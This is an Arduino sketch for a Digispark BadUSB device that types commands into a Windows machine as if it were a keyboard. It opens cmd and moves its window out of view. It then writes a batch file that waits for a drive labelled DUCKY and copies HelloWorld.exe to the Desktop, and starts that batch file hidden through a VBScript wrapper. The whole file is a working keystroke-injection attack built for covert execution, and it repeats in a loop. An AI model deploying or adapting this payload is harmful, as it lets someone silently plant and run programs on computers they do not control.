#include "DigiKeyboard.h"
int NaN = 50;
void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.delay(1000);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.delay(750);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,44);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("M");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  // Change directories because System32 appears to be protected. 
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("CD %TEMP%");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.delay(NaN);
  // Delete batch file if already exists
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("erase /Q DuckyWait.bat");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("copy con DuckyWait.bat");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  // DuckyWait.bat
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print(":while1");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("for /f \"tokens=3 delims= \" %%A in ('echo list volume ^| diskpart ^| findstr \"DUCKY\"') do (set DUCKYdrive=%%A:)");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("if Exist %DUCKYdrive% (");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("goto :break");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print(")");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("timeout /t 30");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("goto :while1");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print(":break");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  // Continue script.
  DigiKeyboard.delay(NaN);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("set DUCKYdrive=%DUCKYdrive%\\CopyFileToDesktop\\");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("copy %DUCKYdrive%HelloWorld.exe %userprofile%\\Desktop\\HelloWorld.exe");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  // MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
  DigiKeyboard.delay(NaN);
  // Delete vbs file if already exists
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("erase /Q invis.vbs");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("copy con invis.vbs");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("wscript.exe invis.vbs DuckyWait.bat");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
  DigiKeyboard.print("EXIT");
  DigiKeyboard.delay(NaN);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(NaN);
}
